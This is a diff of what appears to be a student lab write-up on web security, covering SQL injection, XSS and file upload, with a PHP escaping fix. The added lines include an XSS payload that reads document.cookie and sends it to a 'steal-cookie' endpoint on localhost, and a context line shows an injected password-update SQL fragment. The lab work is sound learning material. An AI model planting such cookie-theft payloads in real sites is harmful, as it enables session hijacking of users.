@@ -128,6 +128,12 @@ son ' , password = 'c22b5f9178342609428d6f51b2c5af4c0bde6a42' where name='Boby' 
 
 ![image](https://github.com/user-attachments/assets/10283733-2f68-4018-8e2b-c11f24f8aa21)
 
+
+![image](https://github.com/user-attachments/assets/72bf67de-3967-4752-bda8-8f4cceefd5fe)
+
+
+
+
 ```php
 <?php
 // Function to create a sql connection.
@@ -234,16 +240,45 @@ $stmt->close();
 Web security – XSS – File Upload Vulnerabilitie 
 
 
-<script>
-  console.log(document.cookie);
-</script>
+<script> console.log(document.cookie); </script>
+
+
+![image](https://github.com/user-attachments/assets/4d76d50b-7a72-4af8-8bbe-bd315f9f5cf1)
 
 
 
+<script>var stolenCookies = encodeURIComponent(document.cookie);window.location = `http://localhost:5173/steal-cookie?cookies=${stolenCookies}`;</script>
+
+![image](https://github.com/user-attachments/assets/5136c38a-1352-4645-987c-6e2d871aea4f)
+
+
+![image](https://github.com/user-attachments/assets/65cb8be8-68de-4dfd-87b4-dc0a280753de)
 
 
 
+```php
+<?php
+  if (isset($_POST['search'])) {
+    $query = htmlspecialchars($_POST['search'], ENT_QUOTES, 'UTF-8');
+    echo "You searched for: " . $query; // Escaped output to prevent XSS
+  }
+?>
+<form action="" method="POST">
+  <input type="text" id="search" name="search" required>
+  <input type="submit">
+</form>
+```
+![image](https://github.com/user-attachments/assets/658879ed-7ef6-4c07-8df5-d7c6b3ca1b2f)
 
+
+![image](https://github.com/user-attachments/assets/f2b162c3-fe61-4323-a43c-a516a66375e5)
+
+
+4.3 Stored-XSS Attac
+
+![image](https://github.com/user-attachments/assets/0741e01e-6577-4141-8338-1d58d9e396c9)
+
+4.3.1.c 
 
 
 
